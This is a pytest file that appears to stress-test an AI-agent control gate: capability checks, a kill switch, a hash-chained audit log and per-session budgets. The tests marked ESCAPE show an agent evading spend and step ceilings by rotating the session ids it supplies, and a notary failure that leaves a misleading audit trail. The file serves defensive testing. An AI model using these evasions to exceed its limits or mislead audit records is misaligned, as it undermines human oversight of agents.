    for star in ("*", "＊", "﹡", " * ", "∗"):
        d = layer.check(Action("agent:bot", "delete_database", "p", capability=star))
        assert d.verdict is Verdict.DENY, star


def test_CONTAINED_kill_switch_cannot_be_outrun_by_a_new_session(tmp_path):
    """`monitor.stop()` is checked before any per-session state is touched
    (runtime.py:248), so unlike every other ceiling in A4 it is NOT evadable by
    rotating the session id. The one temporal control that holds."""
    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    gate, monitor = _gate(tmp_path, reg)
    tool = Recorder()
    monitor.stop()
    for i in range(5):
        a = Action("agent:bot", "send_email", "account_recovery",
                   session_id=f"fresh-{i}", nonce=f"n{i}")
        assert gate.dispatch(a, {"send_email": tool}).executed is False
    assert not tool.fired


def test_CONTAINED_interior_audit_edits_insert_delete_reorder_are_detected(tmp_path):
    """The chain does what it says for interior tampering — only the TAIL (A9)
    is free."""
    p = tmp_path / "a.jsonl"
    audit = HashChainedAudit(p)
    for i in range(4):
        audit.record(Action("a", "t", "p", session_id="s", nonce=str(i)),
                     Decision(Verdict.ALLOW, f"r{i}"), layer="x")
    orig = p.read_text(encoding="utf-8").splitlines()

    for mutated in (
        orig[:1] + orig[2:],                                   # interior delete
        [orig[0], orig[2], orig[1], orig[3]],                  # reorder
        orig[:2] + [orig[1]] + orig[2:],                       # insert (dup)
        orig[:1] + [orig[1].replace('"r1"', '"HACKED"')] + orig[2:],   # edit
    ):
        p.write_text("\n".join(mutated) + "\n", encoding="utf-8")
        ok, _why = HashChainedAudit.verify_detail(_Reader(p))  # type: ignore[arg-type]
        assert ok is False
        # and the constructor refuses to resume a broken chain
        with pytest.raises(ValueError):
            HashChainedAudit(p)


class _Reader:
    """Minimal shim so `verify_detail` (which touches only `self._path`) can be
    run against a file without constructing a `HashChainedAudit`, whose
    constructor deliberately refuses to open a broken chain."""

    def __init__(self, path) -> None:
        self._path = pathlib.Path(path)


def test_ESCAPE_A5c_real_make_anchor_reproduces_it_with_shipped_code(tmp_path):
    """A5 with no synthetic parts: `notary.make_anchor` against an unreachable
    notary. The repo's own `test_make_anchor_fail_closed_when_unreachable`
    asserts this callback raises — that is the documented, intended behaviour.
    Wire it into `ControlledGate` (its stated purpose) and every call becomes a
    DENY whose only durable trace is an `allow` line."""
    import socket

    from authgate_gate.notary import NotaryClient, make_anchor

    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    dead_port = s.getsockname()[1]
    s.close()

    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    audit = HashChainedAudit(
        tmp_path / "audit.jsonl",
        anchor=make_anchor(NotaryClient("127.0.0.1", dead_port, key=b"k", timeout=0.5), "g"),
    )
    gate = ControlledGate(
        capability=CapabilityLayer(reg),
        policy=PolicyEngine.from_file(SHIPPED_POLICY),
        runtime=RuntimeLayer(RuntimeMonitor(RuntimeConfig())),
        audit=audit,
    )
    tool = Recorder()
    res = gate.dispatch(
        Action("agent:bot", "send_email", "account_recovery", session_id="s", nonce="n"),
        {"send_email": tool},
    )
    assert res.decision.verdict is Verdict.DENY and not tool.fired
    lines = _audit_lines(tmp_path / "audit.jsonl")
    assert [e["verdict"] for e in lines] == ["allow"]     # ESCAPE
    assert not any(e["verdict"] == "deny" for e in lines)


def test_ESCAPE_A4d_session_rotation_is_reachable_through_the_shipped_adapter(tmp_path):
    """Reachability check for A4: `AIToolAdapter.normalize` copies `session_id`
    and `nonce` straight out of the raw agent-supplied event
    (adapter.py:150-151). So the temporal-ceiling bypass needs no direct `Action`
    construction — it is reachable through the reference adapter, from the raw
    MCP-shaped event the agent itself emits."""
    from authgate_gate import AIToolAdapter

    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "pay")
    gate, _ = _gate(tmp_path, reg,
                    config=RuntimeConfig(max_steps=1, budgets={"spend": 5.0}))
    adapter, pay = AIToolAdapter(), Recorder("pay")

    for i in range(20):
        raw = {"actor": "agent:bot", "tool": "pay", "purpose": "account_recovery",
               "arguments": {"amount": 5.0},
               "session_id": f"agent-picked-{i}", "nonce": "SAME"}
        assert gate.dispatch(adapter.normalize(raw), {"pay": pay}).executed is True
    assert len(pay.calls) == 20   # $100 against a $5 ceiling, one nonce, 20 steps


def test_CONTAINED_shipped_adapters_do_not_expose_the_capability_field(tmp_path):
    """Honest bound on A1: all three shipped adapters leave `capability` empty,
    so the ABI derives `tool:<tool>` and the decoupling is NOT reachable through
    them. A1 requires a caller that constructs `Action` directly (as the README
    quickstart, the examples and every test in `tests/` do) and lets the agent
    influence the `capability` field."""
    from authgate_gate import AIToolAdapter, FinanceAdapter, QuantumJobAdapter

    a = AIToolAdapter().normalize({"actor": "x", "tool": "send_email", "capability": "*"})
    f = FinanceAdapter().normalize({"actor": "x", "operation": "transfer", "capability": "*"})
    q = QuantumJobAdapter().normalize({"actor": "x", "job": "submit_circuit", "capability": "*"})
    assert a.capability == "tool:send_email"
    assert f.capability == "tool:transfer"
    assert q.capability == "tool:submit_circuit"


def test_CONTAINED_non_action_input_still_fails_closed(tmp_path):
    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    gate, _ = _gate(tmp_path, reg)
    for bogus in (None, 42, "action", {"tool": "x"}, object()):
        d = gate.enforce(bogus)  # type: ignore[arg-type]
        assert d.verdict is Verdict.DENY


def test_CONTAINED_negative_and_nonfinite_costs_still_held(tmp_path):
    """Regression check on the previously-fixed budget-integrity bugs, using the
    transformed-payload path (redaction runs before the cost is computed) to make
    sure the fix is not bypassable from that side."""
    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    gate, _ = _gate(tmp_path, reg, config=RuntimeConfig(budgets={"spend": 10.0}))
    tool = Recorder()
    for amt in (-1_000_000.0, float("inf"), float("nan"), float("-inf")):
        a = Action("agent:bot", "pay", "account_recovery",
                   payload={"amount": amt}, session_id="s1", nonce=str(amt))
        gate.dispatch(a, {"pay": tool})
    a = Action("agent:bot", "pay", "account_recovery",
               payload={"amount": 11.0}, session_id="s1", nonce="final")
    assert gate.dispatch(a, {"pay": tool}).executed is False
